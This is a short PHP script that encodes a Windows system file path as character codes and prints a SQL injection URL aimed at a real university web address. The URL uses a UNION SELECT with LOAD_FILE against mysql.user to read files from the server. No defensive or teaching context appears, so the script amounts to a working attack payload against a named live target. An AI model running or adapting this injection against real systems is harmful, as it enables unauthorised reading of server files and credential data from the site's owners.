<?php

require_once 'snoopy.php';
require_once 'simple_html_dom.php';

$str = "<html><head><title>ASDF</title>".
	   "<script>ASDF</script></head>".
	   "<body>ASDF<img alt=\"ASDF\"><img alt='ASDF'>".
	   "</body></html>";

function vcifry($text)
{
	$res = array();
	foreach(str_split($text,1) as $sym)
	{
		$res[] = ord($sym);
	}
	return implode(",", $res);
}

$str = vcifry("c:\Windows\System32\Drivers\etc\hosts");

echo "http://caeff.ces.clemson.edu/content/?id=-3+union+select+1,LOAD_FILE(char({$str})),3,4+from+mysql.user--";